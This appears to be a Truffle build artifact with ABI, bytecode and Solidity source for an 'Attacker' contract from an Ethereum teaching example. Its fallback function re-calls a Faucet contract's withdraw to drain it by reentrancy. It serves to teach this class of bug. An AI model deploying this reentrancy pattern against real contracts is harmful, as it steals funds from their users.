{
  "contractName": "Attacker",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "destroy",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "gasleft",
          "type": "uint256"
        }
      ],
      "name": "ReEntry",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "faucet_address",
          "type": "address"
        }
      ],
      "name": "startAttack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103d3806100536000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806383197ef0146101355780638f088f921461014c575b7ff49d31ba27c4ed640df5bc333d17404076f8da02c1e33f6f3eed2a76ec5a82fa5a6040518082815260200191505060405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d662386f26fc100006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561011b57600080fd5b505af115801561012f573d6000803e3d6000fd5b50505050005b34801561014157600080fd5b5061014a61018f565b005b34801561015857600080fd5b5061018d600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102b3565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610279576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e8152602001807f4f6e6c792074686520636f6e7472616374206f776e65722063616e2063616c6c81526020017f20746869732066756e6374696f6e00000000000000000000000000000000000081525060400191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d662386f26fc100006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561038c57600080fd5b505af11580156103a0573d6000803e3d6000fd5b50505050505600a165627a7a7230582006f5d901630ebae19163780283eac3683f2a4cd5c9a6c093857f9a528ce1d35d0029",
  "source": "pragma solidity ^0.4.22;\n\nimport \"./Faucet.sol\";\n\ncontract Attacker is mortal {\n\tevent ReEntry(uint gasleft);\n\tFaucet faucet;\n\n\tfunction startAttack(address faucet_address) public {\n\t\tfaucet = Faucet(faucet_address);\n\t\tfaucet.withdraw(0.01 ether);\n\t}\n\n\tfunction () external payable {\n\t\temit ReEntry(gasleft());\n\t\tfaucet.withdraw(0.01 ether);\n\t}\n}\n",
  "sourcePath": "/home/aantonop/Dev/ethereumbook/code/truffle/FaucetReentryAttack/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-05-23T11:06:22.139Z"
}